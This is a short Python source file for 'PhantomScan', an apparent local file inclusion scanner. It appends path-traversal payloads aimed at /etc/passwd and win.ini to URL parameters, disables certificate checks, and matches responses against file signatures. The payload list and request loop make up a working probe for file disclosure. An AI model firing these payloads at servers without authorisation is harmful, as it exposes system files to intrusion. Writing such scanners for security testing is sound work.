"""
PhantomScan Advanced LFI Scanner
Author: Asad Ullah
"""

import requests
import urllib3

urllib3.disable_warnings()

class LFIScanner:

    def __init__(self):

        self.payloads = [

            "../../../../etc/passwd",

            "../../../../../../etc/passwd",

            "..%2f..%2f..%2f..%2fetc%2fpasswd",

            "..\\..\\..\\..\\windows\\win.ini",

            "../../../../windows/win.ini",

            "/etc/passwd",

            "C:\\Windows\\win.ini"
        ]

        self.timeout = 10

    # =====================================
    # DETECT LFI
    # =====================================

    def is_lfi_success(
        self,
        response_text
    ):

        indicators = [

            "root:x:0:0",

            "[extensions]",

            "[fonts]",

            "/bin/bash",

            "daemon:x:"
        ]

        for indicator in indicators:

            if indicator.lower() in response_text.lower():

                return True

        return False

    # =====================================
    # MAIN SCAN
    # =====================================

    def scan(
        self,
        url,
        params
    ):

        findings = []

        if not params:
            return findings

        for param in params:

            for payload in self.payloads:

                try:

                    target_url = (
                        f"{url}"
                        f"?{param}={payload}"
                    )

                    response = requests.get(
                        target_url,
                        timeout=self.timeout,
                        verify=False
                    )

                    if self.is_lfi_success(
                        response.text
                    ):

                        findings.append({

                            "type":
                                "Local File Inclusion",

                            "url":
                                target_url,

                            "parameter":
                                param,

                            "payload":
                                payload,

                            "severity":
                                "Critical",

                            "description":
                                "LFI vulnerability detected. "
                                "Sensitive system files may "
                                "be accessible.",

                            "impact":
                                "Attackers may read "
                                "sensitive files and "
                                "gain server information.",

                            "remediation":
                                "Validate user input "
                                "and avoid direct file "
                                "inclusion from user input."
                        })

                except Exception:
                    pass

        return findings
